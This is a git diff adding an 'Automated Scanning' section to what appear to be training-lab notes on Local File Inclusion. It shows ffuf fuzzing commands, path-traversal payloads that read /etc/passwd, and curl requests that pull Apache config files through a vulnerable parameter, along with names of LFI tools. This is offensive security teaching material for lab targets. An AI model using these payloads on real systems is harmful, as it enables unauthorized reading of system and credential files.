@@ -46,6 +46,13 @@
     - [Log Poisoning](#log-poisoning)
       - [PHP Session Poisoning](#php-session-poisoning)
       - [Server Log Poisoning](#server-log-poisoning)
+  - [Automated Scanning](#automated-scanning)
+    - [Fuzzing Parameters](#fuzzing-parameters)
+    - [LFI wordlists](#lfi-wordlists)
+    - [Fuzzing Server Files](#fuzzing-server-files)
+      - [Server Webroot](#server-webroot)
+      - [Server Logs/Configs](#server-logsconfigs)
+    - [LFI Tools](#lfi-tools)
 
 ---
 
@@ -777,3 +784,176 @@ Finally, there are other similar log poisoning techniques that you ma utilize on
 - ``` /var/log/vsftpd.log ```
 
 You should first attempt reading these logs through LFI, and if you do have access to them, you can try to poison them as you did above. For example, if the ssh of ftp services are exposed to you, you can read their logs through LFI, then you can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies to the mail services, as you can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. You can generalize this technique to any logs that log a parameter you control and that you can read through the LFI vuln.
+
+## Automated Scanning
+
+### Fuzzing Parameters
+
+The HTML forms users can use on the web app front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
+
+For example, you can fuzz the page for common GET parameters as follows:
+
+```bash
+d41y@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
+ :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
+```
+
+Once you identify an exposed parameter that isn't linked to any forms you tested, you can perform all of the LFI tests discussed before. This is not unique to LFI vulns but also applies to most web vulnerabilities, as exposed parameters may be vulnerable to any other vuln as well.
+
+### LFI wordlists
+
+There are a number of LFI wordlists you can use for a scan. A good worlist is ```LFI-Jhaddix.txt```, as it contains various bypasses and common files, so it makes it easy to run several tests at once. You can use this wordlist to fuzz the ```?language=``` parameter you have been testing.
+
+```bash
+d41y@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
+ :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
+...SNIP...
+../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+```
+
+As you can see, the scan yielded a number of LFI payloads that can be used to exploit the vuln. Once you have the identified payloads, you should manually test them to verify that they work as expected and show the included file content.
+
+### Fuzzing Server Files
+
+In addition to fuzzing LFI payloads, there are different server files that may be helpful in your LFI exploitation, so it would be helpful to know where such files exist and whether you can read them. Such files include:
+
+- Server webroot path
+- Server config files
+- Server logs
+
+#### Server Webroot
+
+You may need to know the full server webroot path to complete your exploitation in some cases. For example, if you wanted to locate a file you uploaded, but you cannot reach its ```/uploads``` directory through relative paths. In such cases, you may need to figure out the server webroot path so that you can locate your uploaded files through paths instead of relative paths.
+
+To do so, you can fuzz for the ```index.php``` file through common webroot paths. Depending on your LFI situation, you may need to add a few back directories, and then add your ```index.php``` afterwards.
+
+Example:
+
+```bash
+d41y@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+...SNIP...
+
+: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+```
+
+As you can see, the scan did indeed identify the correct webroot path at ```/var/www/html/```. You may also use the same ```LFI-Jhaddix.txt``` wordlist you used earlier, as it contains various payloads that may reveal the webroot. If this does not help you in identifying the webroot, then your best choice would be to read the server configs, as they tend to contain the webroot and other important information.
+
+
+#### Server Logs/Configs
+
+[Linux-Wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
+
+[Windows-Wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
+
+Example:
+
+```bash
+d41y@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
+ :: Wordlist         : FUZZ: ./LFI-WordList-Linux
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
+/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
+/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
+/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
+/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
+/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
+...SNIP...
+/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
+/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
+/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
+/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
+```
+
+As you can see, the scan returned over 60 results, many of which were not identified with the ```LFI-Jhaddix.txt``` wordlist, which shows you that a precise scan is important in certain cases. Now, you can try reading any of these files to see whether you can get their content. You will read ```/etc/apache2/apache2.conf```, as it is a known path for the apache server config.
+
+```bash
+d41y@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+
+...SNIP...
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+...SNIP...
+```
+
+As you can see, you do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (_```APACHE_LOG_DIR```_), which are found in another file you saw above, which is ```/etc/apache2/envvars```, and you can read it to find the variable values:
+
+```bash
+d41y@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+
+...SNIP...
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state file location. This might be changed to /run in Wheezy+1
+export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
+export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
+export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+...SNIP...
+```
+
+As you can see, the ```APACHE_LOG_DIR``` variable is set to ```/var/log/apache2```, and the previous config told you that the log files are ```/access.log``` and ```/error.log```.
+
+### LFI Tools
+
+Finally, you can utilize a number of LFI tools to automate much of the process, which may save some time in some cases, but may also miss many vulnerabilities and files you may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). You can also search GitHub for various other LFI tools and scripts.
